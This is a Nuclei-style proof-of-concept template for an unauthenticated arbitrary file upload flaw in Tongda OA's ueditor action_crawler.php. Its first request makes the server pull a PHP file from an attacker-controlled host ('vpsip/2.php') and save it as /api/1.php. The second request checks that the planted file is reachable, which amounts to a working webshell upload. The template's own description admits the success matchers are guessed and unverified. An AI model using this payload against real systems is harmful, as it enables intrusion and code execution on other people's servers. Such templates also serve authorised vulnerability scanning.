id: poc-df72d27a855df74ac2d2
info:
  name: 通达OAaction_crawler存在前台任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /module/ueditor/php/action_crawler.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36

    Content-Length: 197

    Accept-Encoding: gzip, deflate

    Connection: close

    Content-Type: application/x-www-form-urlencoded


    CONFIG[catcherPathFormat]=/api/1&CONFIG[catcherMaxSize]=100000&CONFIG[catcherAllowFiles][]=.php&CONFIG[catcherAllowFiles][]=.ico&CONFIG[catcherFieldName]=file&file[]=http://vpsip/2.php'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /api/1.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36

    Accept-Encoding: gzip, deflate

    Connection: close

    Content-Length: 2'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
